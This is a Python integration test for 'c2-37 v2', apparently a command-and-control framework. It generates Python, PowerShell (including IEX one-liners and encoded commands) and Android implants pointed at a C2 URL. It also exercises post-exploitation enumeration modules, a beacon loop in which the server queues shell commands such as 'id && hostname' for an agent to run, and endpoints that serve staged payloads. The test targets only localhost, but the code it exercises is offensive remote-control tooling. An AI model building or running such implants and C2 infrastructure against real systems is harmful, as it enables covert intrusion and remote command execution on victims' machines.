"""Integration test for c2-37 v2 — crypto, payloads, modules, server."""
import time
import json
import urllib.request
import sys

print("=" * 60)
print("  c2-37 v2 Integration Test")
print("=" * 60)

# ── Test 1: Crypto ──
print("\n[1] Testing crypto module...")
from c2_37.crypto import derive_key, encrypt, decrypt, encrypt_json, decrypt_json, generate_psk

psk = generate_psk()
key = derive_key(psk)
plaintext = b"Hello from c2-37! This is a secret message."
encrypted = encrypt(plaintext, key)
decrypted = decrypt(encrypted, key)
assert decrypted == plaintext, f"Decrypt failed: {decrypted}"
print(f"    [+] Symmetric encrypt/decrypt OK (key={psk[:16]}...)")

test_dict = {"cmd": "whoami", "args": {"timeout": 30}}
enc_json = encrypt_json(test_dict, key)
dec_json = decrypt_json(enc_json, key)
assert dec_json == test_dict, f"JSON decrypt failed: {dec_json}"
print(f"    [+] JSON encrypt/decrypt OK")

# Test wrong key detection
try:
    wrong_key = derive_key("wrong_password")
    decrypt(encrypted, wrong_key)
    print("    [-] HMAC check FAILED (should have raised)")
    sys.exit(1)
except ValueError as e:
    print(f"    [+] Wrong key detected: {e}")

# ── Test 2: Payloads ──
print("\n[2] Testing payload generator...")
from c2_37 import payloads

url = "http://10.10.10.10:8037"
py = payloads.python_implant(url)
assert "Implant" in py and url in py
print(f"    [+] Python implant: {len(py)} bytes")

ps = payloads.powershell_implant(url)
assert "$C2" in ps and url in ps
print(f"    [+] PowerShell implant: {len(ps)} bytes")

android = payloads.android_implant(url)
assert "AndroidImplant" in android and "getprop" in android
print(f"    [+] Android implant: {len(android)} bytes")

ol = payloads.python_oneliner(url)
assert url in ol and "exec" in ol
print(f"    [+] Python one-liner OK")

ps_ol = payloads.powershell_oneliner(url)
assert url in ps_ol and "IEX" in ps_ol
print(f"    [+] PowerShell one-liner OK")

ps_enc = payloads.powershell_encoded(url)
assert "-enc " in ps_enc
print(f"    [+] Encoded PowerShell OK")

all_payloads = payloads.generate_all(url)
print(f"    [+] generate_all: {len(all_payloads)} formats")

# ── Test 3: Modules ──
print("\n[3] Testing post-exploitation modules...")
from c2_37.modules import list_modules, run_module

mods = list_modules()
print(f"    [+] {len(mods)} modules available: {[m['name'] for m in mods]}")

# Run enum_users
result = run_module("enum_users")
assert "users" in result or "raw" in result
print(f"    [+] enum_users: found {len(result.get('users', []))} users")

# Run enum_network
result = run_module("enum_network")
assert "interfaces" in result
print(f"    [+] enum_network: OK")

# Run enum_processes
result = run_module("enum_processes")
assert "processes" in result
print(f"    [+] enum_processes: OK")

# Unknown module
result = run_module("nonexistent")
assert "error" in result
print(f"    [+] Unknown module error handling OK")

# ── Test 4: Server + Agent full loop ──
print("\n[4] Testing server + agent loop...")
from c2_37.server import C2Server
from c2_37.implant import Implant

server = C2Server(port=8038)
server.start(background=True)
print("    [+] Server started on :8038")
time.sleep(0.5)

agent = Implant("http://127.0.0.1:8038")
ok = agent.register()
assert ok, "Registration failed"
print(f"    [+] Agent registered: id={agent.id}")

# Queue shell command
cmd_data = json.dumps({
    "agent_id": agent.id,
    "type": "shell",
    "args": {"cmd": "id && hostname"}
}).encode()
req = urllib.request.Request(
    "http://127.0.0.1:8038/api/cmd",
    data=cmd_data,
    headers={"Content-Type": "application/json"},
)
resp = json.loads(urllib.request.urlopen(req).read())
print(f"    [+] Shell command queued: {resp.get('id', '?')}")

# Queue module command
cmd_data2 = json.dumps({
    "agent_id": agent.id,
    "type": "module",
    "args": {"name": "enum_users"}
}).encode()
req2 = urllib.request.Request(
    "http://127.0.0.1:8038/api/cmd",
    data=cmd_data2,
    headers={"Content-Type": "application/json"},
)
urllib.request.urlopen(req2)
print("    [+] Module command queued")

# Agent beacons and executes
cmds = agent.beacon()
print(f"    [+] Agent received {len(cmds)} commands")
for cmd in cmds:
    result = agent.execute(cmd)
    agent.send_result(result)
    if result.get("stdout"):
        print(f"        shell> {result['stdout'].strip()[:80]}")
    elif result.get("users"):
        print(f"        module> enum_users found {len(result['users'])} users")

# Check API endpoints
resp = json.loads(urllib.request.urlopen("http://127.0.0.1:8038/api/agents").read())
assert len(resp["agents"]) == 1
print(f"    [+] API /api/agents: {len(resp['agents'])} agent(s)")

resp = json.loads(urllib.request.urlopen(f"http://127.0.0.1:8038/api/results/{agent.id}").read())
print(f"    [+] API /api/results: {len(resp['results'])} result(s)")

# Test stage endpoints
stage_py = urllib.request.urlopen("http://127.0.0.1:8038/stage").read()
assert b"Implant" in stage_py
print(f"    [+] /stage (Python): {len(stage_py)} bytes")

stage_ps = urllib.request.urlopen("http://127.0.0.1:8038/stage/ps").read()
assert b"$C2" in stage_ps
print(f"    [+] /stage/ps (PowerShell): {len(stage_ps)} bytes")

# Test modules API
resp = json.loads(urllib.request.urlopen("http://127.0.0.1:8038/api/modules").read())
print(f"    [+] API /api/modules: {len(resp['modules'])} modules")

# Test TLS cert generation
print("\n[5] Testing TLS support...")
cert, key = server.generate_self_signed_cert("/tmp/test_c2.pem", "/tmp/test_c2.key")
import os
assert os.path.exists(cert) and os.path.exists(key)
print(f"    [+] Self-signed cert generated: {cert}")
os.unlink(cert)
os.unlink(key)

server.stop()
print("\n" + "=" * 60)
print("  ALL TESTS PASSED")
print("=" * 60)
